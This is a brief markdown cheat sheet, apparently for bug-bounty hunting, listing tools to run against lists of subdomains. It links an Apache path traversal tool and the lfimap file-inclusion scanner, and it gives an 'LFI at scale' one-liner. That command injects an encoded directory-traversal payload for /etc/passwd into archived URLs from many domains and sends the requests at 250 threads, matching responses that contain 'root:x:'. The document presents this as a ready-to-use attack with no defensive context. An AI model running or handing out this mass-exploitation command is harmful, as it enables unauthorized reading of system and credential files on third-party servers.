 This file contains the list of tools or scripts which can be directly run on the subdomains list to find the vulnerabilities

> 1. Apache Path Traversal:
```
https://github.com/imhunterand/ApachSAL
```

> 2. Local File Include Check:
```
> https://github.com/hansmach1ne/lfimap
LFI at scale 🔥🔥🔥🔥
cat rootsDomains.txt | waybackurls | qsreplace ".%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./etc/passwd" | httpx -silent -nc -mr "root:x:" -t 250 
```
